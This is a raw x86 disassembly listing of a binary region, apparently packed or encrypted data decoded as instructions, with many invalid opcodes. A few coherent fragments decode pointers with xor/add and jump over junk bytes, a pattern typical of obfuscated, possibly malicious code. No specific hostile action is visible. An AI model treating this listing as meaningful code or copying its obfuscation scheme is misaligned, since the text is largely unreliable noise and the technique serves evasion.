  405b64:	mov    WORD PTR [esi+ecx*1+0x43cd92df],cs
  405b6b:	xor    eax,0x366d594b
  405b70:	xchg   edi,eax
  405b71:	rcr    BYTE PTR [ecx+0x44806f90],0x2a
  405b78:	jg     0x405b1c
  405b7a:	or     al,0x81
  405b7c:	mov    cl,0x83
  405b7e:	mov    ecx,0x51003f59
  405b83:	icebp  
  405b84:	ss shl esp,0x23
  405b88:	dec    esi
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	test   BYTE PTR [edx+ebx*8],cl
  405bae:	dec    esi
  405baf:	pusha  
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b87
  405bb8:	jb     0x405b73
  405bba:	mov    edx,0xea2c306d
  405bbf:	inc    eax
  405bc0:	mov    edi,0x6c410302
  405bc5:	loope  0x405c26
  405bc7:	push   cs
  405bc8:	addr16 ror cl,0x82
  405bcc:	out    0x7f,eax
  405bce:	fsub   QWORD PTR [edi+0x3974f3df]
  405bd4:	jno    0x405b76
  405bd6:	xor    eax,0xafd4dbd1
  405bdb:	jo     0x405c02
  405bdd:	addr16 jmp 0x1de9:0x8e5595ee
  405be5:	jnp    0x405c26
  405be7:	xor    DWORD PTR [edi-0x4b],ebx
  405bea:	fisttp QWORD PTR [ebp-0x4d58c9c4]
  405bf0:	jp     0x405c05
  405bf2:	or     ch,cl
  405bf4:	lea    ecx,[edi+eax*4+0x35]
  405bf8:	cmp    al,0x2
  405bfa:	and    eax,0xffffffaa
  405bfd:	sbb    al,0xe8
  405bff:	jg     0x405c49
  405c01:	repnz ror BYTE PTR [ebp-0x2c1146c0],1
  405c08:	mov    ds:0xce63f60b,al
  405c0d:	adc    eax,0x169e9f81
  405c12:	mov    dl,0x8c
  405c14:	fstp   DWORD PTR [ecx]
  405c16:	xor    BYTE PTR [ecx+ecx*4],cl
  405c19:	pop    edi
  405c1a:	ror    bl,0x78
  405c1d:	inc    esi
  405c1e:	lds    esi,FWORD PTR [esi]
  405c20:	xchg   edx,eax
  405c21:	or     BYTE PTR ds:0xf84b9d6f,dl
  405c27:	and    cl,dl
  405c29:	cmp    dh,cl
  405c2b:	adc    ebp,ebx
  405c2d:	sub    eax,0xaa483888
  405c32:	mov    DWORD PTR [ebp+0x5da50f90],ebx
  405c38:	jl     0x405c30
  405c3a:	icebp  
  405c3b:	call   0xb539:0x42622265
  405c42:	jns    0x405c05
  405c44:	clc    
  405c45:	cmp    al,0x4a
  405c47:	sbb    eax,0xee531dfb
  405c4c:	sbb    al,0x7f
  405c4e:	add    BYTE PTR [ecx],dh
  405c50:	sbb    edi,DWORD PTR [ebx]
  405c52:	(bad)  
  405c53:	jne    0x405c6b
  405c55:	mov    ecx,0xd244918d
  405c5a:	mov    cl,al
  405c5c:	hlt    
  405c5d:	(bad)  
  405c5e:	pop    ebp
  405c5f:	mov    eax,0x29ee1c
  405c64:	fsubr  QWORD PTR [ecx]
  405c66:	pop    es
  405c67:	cli    
  405c68:	sbb    dh,BYTE PTR [ecx+0x35]
  405c6b:	pop    ecx
  405c6c:	(bad)  
  405c6d:	retf   0x8a07
  405c70:	int    0xce
  405c72:	jmp    0x405c6f
  405c74:	retf   0x6f82
  405c77:	fwait
  405c78:	add    al,0x38
  405c7a:	ret    
  405c7b:	rcl    BYTE PTR [ecx],1
  405c7d:	jb     0x405cb4
  405c7f:	in     al,0x4e
  405c81:	sub    esi,ebx
  405c83:	mov    WORD PTR [edx],?
  405c85:	xchg   esi,eax
  405c86:	jb     0x405c63
  405c88:	das    
  405c89:	dec    ecx
  405c8a:	cli    
  405c8b:	shl    DWORD PTR [esi+0x140316e3],0x8a
  405c92:	pop    ss
  405c93:	mov    esi,0x27e02d7
  405c98:	sub    eax,0xf9039a63
  405c9d:	push   ds
  405c9e:	xor    BYTE PTR [edx-0x46aaef63],ah
  405ca4:	adc    BYTE PTR [eax-0x4b],bl
  405ca7:	inc    esi
  405ca8:	int3   
  405ca9:	out    0xa1,eax
  405cab:	ja     0x405c40
  405cad:	jle    0x405cc4
  405caf:	adc    al,0x14
  405cb1:	sub    dh,BYTE PTR [eax-0x35]
  405cb4:	lea    ebx,[ecx]
  405cb6:	neg    BYTE PTR [eax+edx*2]
  405cb9:	stos   DWORD PTR es:[edi],eax
  405cba:	and    eax,0x68acdf54
  405cbf:	pop    edi
  405cc0:	cmp    edi,ebp
  405cc2:	jmp    0x405d32
  405cc4:	cmp    DWORD PTR [ecx+ebp*8],ebx
  405cc7:	adc    BYTE PTR [esi-0x79],al
  405cca:	or     dl,al
  405ccc:	jecxz  0x405cf9
  405cce:	aas    
  405ccf:	imul   ecx,DWORD PTR [ebx-0x52],0x29
  405cd3:	mov    al,0x19
  405cd5:	test   eax,0xcf118ed6
  405cda:	sar    edi,0x98
  405cdd:	cwde   
  405cde:	ror    BYTE PTR [ebp+esi*4+0x3a],0xf6
  405ce3:	dec    ebx
  405ce4:	mov    al,ds:0x3e5bbed2
  405ce9:	lods   al,BYTE PTR ds:[esi]
  405cea:	jae    0x405d47
  405cec:	test   eax,esp
  405cee:	jl     0x405d14
  405cf0:	lods   eax,DWORD PTR ds:[esi]
  405cf1:	(bad)  
  405cf2:	sbb    ch,BYTE PTR [edx]
  405cf4:	inc    edi
  405cf5:	and    DWORD PTR [di-0x5df6],esi
  405cfa:	mov    ds:0x7eecd824,eax
  405cff:	jno    0x405d17
  405d01:	mov    al,0xf4
  405d03:	mov    bl,dl
  405d05:	out    0x9f,al
  405d07:	popa   
  405d08:	xor    BYTE PTR [edi+ebx*4+0x2d3a0273],ah
  405d0f:	pop    ss
  405d10:	add    BYTE PTR [eax+0x7e],cl
  405d13:	inc    edi
  405d14:	ja     0x405d71
  405d16:	xor    al,0x2b
  405d18:	jns    0x405d8e
  405d1a:	sub    al,0xa1
  405d1c:	ins    BYTE PTR es:[edi],dx
  405d1d:	push   eax
  405d1e:	popf   
  405d1f:	or     ebx,DWORD PTR [edi+0x59f9810e]
  405d25:	dec    ebx
  405d26:	pop    ebp
  405d27:	xor    dh,dh
  405d29:	call   0x45aa019
  405d2e:	adc    ebx,DWORD PTR [ebx-0x475af721]
  405d34:	fs (bad) 
  405d37:	inc    ecx
  405d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d39:	or     al,0xd
  405d3b:	pop    esi
  405d3c:	stc    
  405d3d:	mov    cl,0x21
  405d3f:	aad    0x19
  405d41:	mov    eax,0xab474c1e
  405d46:	dec    esi
  405d47:	jnp    0x405d23
  405d49:	push   ecx
  405d4a:	sub    DWORD PTR [ebp-0x3d88ccc3],ecx
  405d50:	sub    al,0x33
  405d52:	repz pop ds
  405d54:	bound  edx,QWORD PTR ds:0x8e363f5a
  405d5a:	sbb    DWORD PTR [ebx],edi
  405d5c:	inc    ebp
  405d5d:	sti    
  405d5e:	dec    esp
  405d5f:	cld    
  405d60:	dec    eax
  405d61:	jl     0x405cfe
  405d63:	fdivr  DWORD PTR [edx+0x438528c6]
  405d69:	js     0x405da8
  405d6b:	push   esp
  405d6c:	dec    ecx
  405d6d:	xor    al,0x92
  405d6f:	jno    0x405d33
  405d71:	sbb    ecx,DWORD PTR [ebp-0x4d9f5b63]
  405d77:	adc    DWORD PTR [ecx+0x2604a0e9],ebx
  405d7d:	xor    bh,ch
  405d7f:	lahf   
  405d80:	pusha  
  405d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d82:	lds    edx,FWORD PTR [ecx-0x3d]
  405d85:	pop    eax
  405d86:	jmp    0x3b6c:0x1db23251
  405d8d:	dec    esi
  405d8e:	adc    DWORD PTR [esi],ecx
  405d90:	arpl   WORD PTR [ebx+ecx*4-0x7f740fbb],di
  405d97:	cwde   
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx-0x763eca5],1
  405dbe:	popa   
  405dbf:	jmp    0x557e:0x7e3747d6
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d85
  405dca:	repz add DWORD PTR [ebx],ecx
  405dcd:	add    BYTE PTR [edi+0x7c],dl
  405dd0:	jle    0x405e01
  405dd2:	cmp    eax,0x6f80df6c
  405dd7:	mov    esp,0xd1068670
  405ddc:	cmp    al,0xea
  405dde:	and    al,0x8f
  405de0:	sub    DWORD PTR [eax+0x51ee2c4f],ecx
  405de6:	push   ebx
  405de7:	mov    al,ds:0x29e420d9
  405dec:	xor    al,0xfc
  405dee:	dec    ebp
  405def:	sub    dl,BYTE PTR [ecx+0x4d]
  405df2:	fdiv   DWORD PTR [edi+0x5ab232cb]
  405df8:	add    al,0xc5
  405dfa:	out    0x55,eax
  405dfc:	mov    ds:0x6b7b4819,eax
  405e01:	shl    DWORD PTR [ecx+ebp*1],cl
  405e04:	ret    0x74c2
  405e07:	xchg   edx,eax
  405e08:	in     al,0xa9
  405e0a:	adc    BYTE PTR [edx+0x26],0x75
  405e0e:	mov    cl,ah
  405e10:	ficom  WORD PTR [ebx+0x167152c]
  405e16:	sub    ecx,DWORD PTR [ebx+0xe6814]
  405e1c:	stc    
  405e1d:	fsubr  st(3),st
  405e1f:	ins    DWORD PTR es:[edi],dx
  405e20:	stc    
  405e21:	ds xor eax,0xb29d04ce
  405e27:	dec    edx
  405e28:	push   cs
  405e29:	jnp    0x405dd8
  405e2b:	inc    edi
  405e2c:	iret   
  405e2d:	rcl    edi,0x74
  405e30:	retf   
  405e31:	mov    bh,0xe9
  405e33:	shrd   DWORD PTR [ecx+edi*8],edi,0x13
  405e38:	int    0xd0
  405e3a:	adc    esi,edx
  405e3c:	cmp    eax,esi
  405e3e:	mov    bl,0xf7
  405e40:	pop    ss
  405e41:	js     0x405dee
  405e43:	fist   WORD PTR [edi]
  405e45:	push   ecx
  405e46:	xchg   esp,eax
  405e47:	adc    esp,esi
  405e49:	fstp   DWORD PTR [edx+0x1c0b450c]
  405e4f:	inc    ebp
  405e50:	xchg   ebp,eax
  405e51:	mov    ah,0xf4
  405e53:	jno    0x405e46
  405e55:	add    BYTE PTR [ebx+0x7574a9b4],0x7a
  405e5c:	push   eax
  405e5d:	fwait
  405e5e:	push   0xfda59c62
  405e63:	int    0x2b
  405e65:	mov    dl,0x4b
  405e67:	mov    BYTE PTR [ebp+0x49],bh
  405e6a:	pusha  
  405e6b:	cmc    
  405e6c:	inc    edx
  405e6d:	mov    ds:0x30f98da3,al
  405e72:	rcl    DWORD PTR [eax],0x18
  405e75:	je     0x405e0f
  405e77:	test   BYTE PTR [ebx],bh
  405e79:	repnz mov ds:0x5490aac4,eax
  405e7f:	inc    esi
  405e80:	adc    edx,DWORD PTR [edi-0x3bead9ea]
  405e86:	neg    BYTE PTR [edx-0x1c]
  405e89:	leave  
  405e8a:	loope  0x405e22
  405e8c:	lods   eax,DWORD PTR ds:[esi]
  405e8d:	and    al,0x22
  405e8f:	push   ecx
  405e90:	cli    
  405e91:	inc    ebx
  405e92:	mov    eax,0x29b840ee
  405e97:	ins    BYTE PTR es:[edi],dx
  405e98:	call   0x4908:0xb12f8193
  405e9f:	aam    0xce
  405ea1:	sub    eax,0xfca38de
  405ea6:	pop    ecx
  405ea7:	xlat   BYTE PTR ds:[ebx]
  405ea8:	adc    DWORD PTR [edi+0xcba0a87],ecx
  405eae:	imul   dx,WORD PTR [ecx+0x3a],0x70
  405eb3:	or     DWORD PTR [eax+0x5e],0x48fb692c
  405eba:	test   eax,0xbe63996c
  405ebf:	inc    esi
  405ec0:	dec    ecx
  405ec1:	or     eax,0x8f17f467
  405ec6:	cmc    
  405ec7:	test   bh,bh
  405ec9:	ins    BYTE PTR es:[edi],dx
  405eca:	pop    es
  405ecb:	frstor [edx]
  405ecd:	push   ecx
  405ece:	push   esi
  405ecf:	mov    eax,ds:0xf36049cc
  405ed4:	mov    bh,0x24
  405ed6:	ror    BYTE PTR [esi+0x25],1
  405ed9:	mov    ebp,0xaecb54b3
  405ede:	mov    eax,0x7bb9c483
  405ee3:	addr16 leave 
  405ee5:	and    BYTE PTR [edi+0x6f],ah
  405ee8:	into   
  405ee9:	sub    BYTE PTR [edx+0x438f9536],dh
  405eef:	int3   
  405ef0:	dec    ebx
  405ef1:	or     al,0x9a
  405ef3:	pusha  
  405ef4:	arpl   ax,ax
  405ef6:	mov    ecx,0x5a08de1f
  405efb:	bound  edx,QWORD PTR [edx+ecx*8+0x2a]
  405eff:	sahf   
  405f00:	imul   esi,edx,0xffffff84
  405f03:	pushf  
  405f04:	cmp    al,ah
  405f06:	cwde   
  405f07:	adc    eax,0xeead3b81
  405f0c:	jg     0x405f19
  405f0e:	mov    ds:0xb097990,eax
  405f13:	mov    dh,0x2b
  405f15:	xchg   esi,eax
  405f16:	dec    eax
  405f17:	push   ss
  405f18:	mov    BYTE PTR [edx+0x44],bl
  405f1b:	inc    ebx
  405f1c:	or     dl,bl
  405f1e:	and    edi,ebx
  405f20:	or     al,0x94
  405f22:	sub    DWORD PTR [ebx+eax*1],ebx
  405f25:	sub    ch,ch
  405f27:	xchg   edx,eax
  405f28:	nop
  405f29:	xor    DWORD PTR [eax+0x1b],esi
  405f2c:	adc    dh,bh
  405f2e:	pushf  
  405f2f:	repnz daa 
  405f31:	or     dh,BYTE PTR [eax-0x3f745208]
  405f37:	out    0xb3,eax
  405f39:	cwde   
  405f3a:	out    dx,eax
  405f3b:	repz rol al,cl
  405f3e:	dec    ch
  405f40:	std    
  405f41:	pminub mm1,QWORD PTR [edi]
  405f44:	cli    
  405f45:	loope  0x405efb
  405f47:	sub    DWORD PTR [edi+0x1c],ecx
  405f4a:	adc    al,0x41
  405f4c:	aam    0x81
  405f4e:	loope  0x405f04
  405f50:	(bad)  
  405f51:	iret   
  405f52:	mov    WORD PTR [ebp+0x40d3e417],fs
  405f58:	cli    
  405f59:	xchg   BYTE PTR [esi-0x8],dh
  405f5c:	aaa    
  405f5d:	into   
  405f5e:	push   ecx
  405f5f:	(bad)  
  405f60:	int3   
  405f61:	mov    edi,ecx
  405f63:	or     eax,0x5fb64084
  405f68:	lods   eax,DWORD PTR ds:[esi]
  405f69:	loopne 0x405f3b
  405f6b:	push   ebx
  405f6c:	addr16 icebp 
  405f6e:	cs xchg esp,eax
  405f70:	adc    bl,BYTE PTR [ebp+0x5ad91f75]
  405f76:	push   DWORD PTR [ebp+0x442e1f2c]
  405f7c:	adc    DWORD PTR [ebx-0x6c],ebx
  405f7f:	(bad)  
  405f80:	pop    ds
  405f81:	and    eax,0xe9da58a7
  405f86:	pop    ecx
  405f87:	mov    ds:0x6d6ccfa2,al
  405f8c:	mov    esp,0x3aa9fd39
  405f91:	fs sar ebx,cl
  405f94:	xchg   ecx,eax
  405f95:	(bad)  
  405f96:	jge    0x405f6c
  405f98:	mov    al,BYTE PTR [edi]
  405f9a:	lea    eax,[edx]
  405f9c:	pop    ebp
  405f9d:	les    ecx,FWORD PTR [ebp+0x21410ebb]
  405fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fa4:	mov    DWORD PTR [ebp-0x20],eax
  405fa7:	je     0x406a43
  405fad:	jmp    0x4061a5
  405fb2:	jmp    0x405fa8
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x4e]
  405fbf:	pop    es
  405fc0:	lods   eax,DWORD PTR ds:[esi]
  405fc1:	retf   
  405fc2:	call   0x7e7f:0x557e7e35
  405fc9:	jle    0x405fd1
  405fcb:	dec    ebx
  405fcc:	add    BYTE PTR [ecx+0x4b594b17],dl
  405fd2:	mov    ds:0x910687c7,al
  405fd7:	adc    BYTE PTR [edi],dl
  405fd9:	push   esp
  405fda:	mov    cl,0x97
  405fdc:	and    eax,0x3d
  405fdf:	out    0x96,eax
  405fe1:	xor    DWORD PTR [eax+0x322b719b],eax
  405fe7:	adc    bh,0xca
  405fea:	dec    esi
  405feb:	repnz push edx
  405fed:	mov    ebx,0x25c5ee26
  405ff2:	jbe    0x405fb8
  405ff4:	pop    eax
  405ff5:	lods   eax,DWORD PTR ds:[esi]
  405ff6:	(bad)  
  405ff7:	mov    edx,ebx
  405ff9:	mov    bh,0xbc
  405ffb:	sbb    BYTE PTR [edx],0xfe
  405ffe:	inc    edi
  405fff:	aad    0x2f
  406001:	stos   BYTE PTR es:[edi],al
  406002:	cld    
  406003:	xor    ah,0x4
  406006:	dec    edi
  406007:	loopne 0x405faa
  406009:	aad    0x83
  40600b:	xor    eax,0xc0a97592
  406010:	arpl   si,bp
  406012:	add    DWORD PTR [ebx],esi
  406014:	div    DWORD PTR [edi]
  406016:	push   ecx
  406017:	add    ecx,ecx
  406019:	ret    
  40601a:	pop    eax
  40601b:	ret    
  40601c:	mov    eax,0x3fc01ee1
  406021:	(bad)  
  406022:	out    0xce,al
  406024:	or     BYTE PTR [eax-0x39],dl
  406027:	push   cs
  406028:	sub    esp,edi
  40602a:	ret    0x7fa0
  40602d:	adc    DWORD PTR [eax+0x3f],edi
  406030:	adc    bh,bl
  406032:	push   ebp
  406033:	cs jp  0x4060aa
  406036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406037:	fdivr  DWORD PTR [ebx+0x7220a6e3]
  40603d:	shl    BYTE PTR [eax-0x64],0x5
  406041:	test   DWORD PTR [edi+0xedafcdd],esi
  406047:	rcl    DWORD PTR [eax],1
  406049:	popa   
  40604a:	mov    ebp,0xd029a1ed
  40604f:	jne    0x405ffd
  406051:	jge    0x405fe5
  406053:	movntps XMMWORD PTR [esi+eax*8+0x6d],xmm5
  406058:	int    0xc3
  40605a:	xchg   esp,eax
  40605b:	mov    ecx,0x54811216
  406060:	rol    ah,0x9
  406063:	sbb    al,0xef
  406065:	mov    eax,DWORD PTR [ebx-0x7277c1a7]
  40606b:	xor    BYTE PTR [ecx-0x7c],ah
  40606e:	mov    al,ds:0xc68ebf88
  406073:	sub    dl,bh
  406075:	mov    edx,0x33ab5edd
  40607a:	mov    ds:0xf124a269,eax
  40607f:	(bad)  
  406080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406081:	loopne 0x40607c
  406083:	std    
  406084:	ror    DWORD PTR [ebx-0x16],1
  406087:	mov    ebp,0x6509c5b7
  40608c:	jl     0x4060d0
  40608e:	mov    edi,0x3dc682ae
  406093:	call   0xcb5b4883
  406098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406099:	jge    0x40601d
  40609b:	push   edi
  40609c:	mov    bl,0x35
  40609e:	or     edi,DWORD PTR [edi-0x55]
  4060a1:	inc    esi
  4060a2:	std    
  4060a3:	push   ds
  4060a4:	popa   
  4060a5:	xchg   esp,eax
  4060a6:	fsubr  DWORD PTR [edx-0x6d1573e8]
  4060ac:	jecxz  0x406104
  4060ae:	jmp    0x8d0e:0x71027b62
  4060b5:	iret   
  4060b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060b7:	jecxz  0x4060ce
  4060b9:	icebp  
  4060ba:	(bad)  
  4060bb:	and    esi,ebx
  4060bd:	lds    esp,FWORD PTR [eax]
  4060bf:	lods   eax,DWORD PTR ds:[esi]
  4060c0:	inc    eax
  4060c1:	in     al,dx
  4060c2:	stos   BYTE PTR es:[edi],al
  4060c3:	fnstsw WORD PTR [edi]
  4060c5:	lods   al,BYTE PTR ds:[esi]
  4060c6:	xchg   esp,eax
  4060c7:	push   edi
  4060c8:	mov    bl,BYTE PTR [edi]
  4060ca:	or     eax,0x7df4da5
  4060cf:	pop    edi
  4060d0:	mov    eax,ds:0x9e9ef357
  4060d5:	inc    esp
  4060d6:	or     al,0x1a
  4060d8:	mov    ebp,0x36745906
  4060dd:	repz xor bh,BYTE PTR [esi+0xbc8c4a6]
  4060e4:	mov    esp,0x80550899
  4060e9:	(bad)  
  4060ea:	hlt    
  4060eb:	sub    al,0x11
  4060ed:	test   esp,ecx
  4060ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f0:	sbb    dh,BYTE PTR [ebx-0x53]
  4060f3:	shl    DWORD PTR [ecx+eiz*1+0x1d3ad203],cl
  4060fa:	test   eax,0x7c8b803b
  4060ff:	adc    al,0xa3
  406101:	shr    DWORD PTR [esi+0x4dea648c],cl
  406107:	inc    esi
  406108:	jb     0x406095
  40610a:	test   eax,0xae3f2b50
  40610f:	cmp    dl,BYTE PTR [eax+0xf]
  406112:	inc    edi
  406113:	inc    edi
  406114:	rcl    BYTE PTR [ebx-0x7272239e],cl
  40611a:	push   ebx
  40611b:	aam    0x24
  40611d:	out    dx,al
  40611e:	mov    ecx,0xbc999da7
  406123:	push   cs
  406124:	lds    esi,FWORD PTR [eax-0x4a530c65]
  40612a:	ret    0x2d8b
  40612d:	sub    BYTE PTR [ebp+ecx*8-0x15e74ff0],cl
  406134:	inc    edx
  406135:	ror    DWORD PTR [ebp+0x6e1efcdb],1
  40613b:	loopne 0x406165
  40613d:	arpl   WORD PTR [edi+0x65],di
  406140:	lahf   
  406141:	out    dx,eax
  406142:	in     al,dx
  406143:	lock jb 0x406158
  406146:	and    esi,DWORD PTR [edi]
  406148:	sahf   
  406149:	fwait
  40614a:	mov    bl,BYTE PTR [esi-0x55]
  40614d:	sub    al,0x61
  40614f:	fcom   DWORD PTR [ebx-0x2b0a83f5]
  406155:	xchg   ecx,eax
  406156:	pop    ecx
  406157:	mov    bl,0x95
  406159:	ss ds mov al,0x94
  40615d:	ficomp DWORD PTR [edi]
  40615f:	cli    
  406160:	xor    dl,BYTE PTR [ebx-0x69]
  406163:	jne    0x4061d8
  406165:	jbe    0x40612a
  406167:	pop    ds
  406168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406169:	pop    eax
  40616a:	je     0x406180
  40616c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616d:	mov    al,ds:0x4b3fe8a5
  406172:	xor    dl,BYTE PTR [ecx-0x2bc1ad87]
  406178:	mov    ds:0x626e8657,al
  40617d:	dec    ebp
  40617e:	push   ds
  40617f:	sahf   
  406180:	dec    edx
  406181:	test   al,0x29
  406183:	addr16 jmp 0x8aa6e189
  406189:	ret    
  40618a:	inc    ecx
  40618b:	clc    
  40618c:	inc    ebp
  40618d:	mov    dl,0xce
  40618f:	sbb    al,0xe3
  406191:	dec    edx
  406192:	inc    ecx
  406193:	hlt    
  406194:	or     ecx,0x23137d5f
  40619a:	leave  
  40619b:	pop    ebx
  40619c:	mov    cl,0xf
  40619e:	in     eax,dx
  40619f:	push   ds
  4061a0:	cmp    bl,bl
  4061a2:	push   0x2c
  4061a4:	pop    ebx
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	test   BYTE PTR [eax-0x2c],ah
  4061d4:	retf   0x33f1
  4061d7:	jle    0x406257
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x40620c
  4061de:	mov    bl,0x5
  4061e0:	sar    dh,0x53
  4061e3:	jecxz  0x406213
  4061e5:	arpl   bx,bp
  4061e7:	xchg   edi,eax
  4061e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061ea:	jecxz  0x40621e
  4061ec:	cwde   
  4061ed:	sahf   
  4061ee:	(bad)  
  4061ef:	(bad)  
  4061f0:	sti    
  4061f1:	lds    esp,FWORD PTR [eax]
  4061f3:	mov    eax,0x1c4291c6
  4061f8:	mov    ecx,0xe45dc559
  4061fd:	scas   al,BYTE PTR es:[edi]
  4061fe:	jno    0x4061d8
  406200:	outs   dx,BYTE PTR ds:[esi]
  406201:	pop    ecx
  406202:	mov    bl,0xe3
  406204:	stos   BYTE PTR es:[edi],al
  406205:	xchg   esi,eax
  406206:	mov    eax,0x8f241aac
  40620b:	sahf   
  40620c:	stos   BYTE PTR es:[edi],al
  40620d:	not    edx
  40620f:	scas   al,BYTE PTR es:[edi]
  406210:	sub    BYTE PTR [edx-0x266efbd1],bh
  406216:	int    0xab
  406218:	push   0xffffff82
  40621a:	sbb    dl,al
  40621c:	fistp  WORD PTR [edx+0x10]
  40621f:	sbb    BYTE PTR [ecx],dh
  406221:	nop
  406222:	cmp    al,BYTE PTR [edi-0x4db56fa9]
  406228:	mov    eax,0x17ad1123
  40622d:	mov    cl,0xed
  40622f:	xor    BYTE PTR [esi-0x551125e0],bh
  406235:	inc    ebx
  406236:	xchg   esi,eax
  406237:	loop   0x406269
  406239:	ss loop 0x4061f7
  40623c:	or     DWORD PTR [ecx+0x442a5c65],ebx
  406242:	in     eax,dx
  406243:	mov    ebx,esi
  406245:	add    BYTE PTR [edx-0x628fdc46],bl
  40624b:	fdiv   st(6),st
  40624d:	(bad)  
  40624e:	call   0x4bef45f
  406253:	dec    ebp
  406254:	cmp    dl,BYTE PTR [edi+0x9]
  406257:	cmp    esp,DWORD PTR [ecx-0x285cbe7d]
  40625d:	inc    esp
  40625e:	inc    ebp
  40625f:	xor    eax,DWORD PTR [ebx]
  406261:	mov    ch,0x15
  406263:	aaa    
  406264:	inc    ecx
  406265:	(bad)  ds:0x502dcff9
  40626b:	lods   eax,DWORD PTR ds:[esi]
  40626c:	mov    ?,WORD PTR [ebp+0x644f5e65]
  406272:	mov    dl,0x81
  406274:	ja     0x40627e
  406276:	icebp  
  406277:	ficom  DWORD PTR ds:0x8e513ee
  40627d:	or     eax,0x86eb645c
  406282:	dec    edi
  406283:	cmp    dl,dl
  406285:	xor    eax,0xb853198e
  40628a:	test   DWORD PTR [esp+ecx*8],ebp
  40628d:	out    dx,al
  40628e:	cmp    ebp,eax
  406290:	xor    ah,cl
  406292:	out    dx,al
  406293:	inc    ecx
  406294:	mov    esi,0x2cb979eb
  406299:	dec    eax
  40629a:	pushf  
  40629b:	mov    ch,bl
  40629d:	mov    edx,0xa13a0884
  4062a2:	cmc    
  4062a3:	mov    al,0xe3
  4062a5:	rol    DWORD PTR [ebx+0x665944],1
  4062ab:	into   
  4062ac:	sub    eax,0x959ebb40
  4062b1:	and    BYTE PTR [edx-0x27404092],ah
  4062b7:	pop    esp
  4062b8:	fidivr WORD PTR [ebx+0x76234f7d]
  4062be:	xor    edi,esi
  4062c0:	jae    0x406334
  4062c2:	xor    edx,esp
  4062c4:	mov    ah,0x2b
  4062c6:	jge    0x4062b8
  4062c8:	test   al,0xcb
  4062ca:	(bad)  
  4062cb:	xchg   esi,eax
  4062cc:	es sbb eax,0x23a82ef8
  4062d2:	xor    ebx,DWORD PTR [edi]
  4062d4:	(bad)  
  4062d5:	gs add al,0x2a
  4062d8:	and    esi,edi
  4062da:	jg     0x406284
  4062dc:	or     eax,0xf09946a1
  4062e1:	add    cl,BYTE PTR [ebp+0x75145e61]
  4062e7:	and    al,bl
  4062e9:	jecxz  0x4062a1
  4062eb:	pop    eax
  4062ec:	les    eax,FWORD PTR [ebp-0x3cb194ec]
  4062f2:	(bad)  
  4062f3:	not    DWORD PTR [ebp-0x3f635a9d]
  4062f9:	dec    ecx
  4062fa:	repz sti 
  4062fc:	pop    ebx
  4062fd:	and    al,0xb6
  4062ff:	stos   BYTE PTR es:[edi],al
  406300:	pushf  
  406301:	dec    esp
  406302:	inc    esp
  406303:	ds inc edx
  406305:	pop    ecx
  406306:	fmul   st,st(1)
  406308:	ja     0x40634d
  40630a:	cmp    al,0xe1
  40630c:	mov    ebp,0xe6994d9
  406311:	and    ecx,edi
  406313:	jne    0x406318
  406315:	and    DWORD PTR [eax+0x15],esi
  406318:	aas    
  406319:	push   ecx
  40631a:	or     eax,0x885d2e40
  40631f:	cwde   
  406320:	cdq    
  406321:	popa   
  406322:	inc    edx
  406323:	retf   0xd91f
  406326:	retfw  0xb9cb
  40632a:	adc    esi,DWORD PTR ds:0x939dca78
  406330:	jg     0x40635c
  406332:	(bad)  gs:[edx+ecx*1-0x6d]
  406337:	neg    DWORD PTR [eax+eiz*4]
  40633a:	push   esi
  40633b:	stc    
  40633c:	jle    0x4062c8
  40633e:	fwait
  40633f:	dec    esi
  406340:	pop    ebx
  406341:	and    ah,cl
  406343:	sbb    ebx,esi
  406345:	mov    eax,ds:0x13ac785b
  40634a:	leave  
  40634b:	int    0xd2
  40634d:	aam    0x7b
  40634f:	jecxz  0x4063c5
  406351:	push   es
  406352:	inc    esp
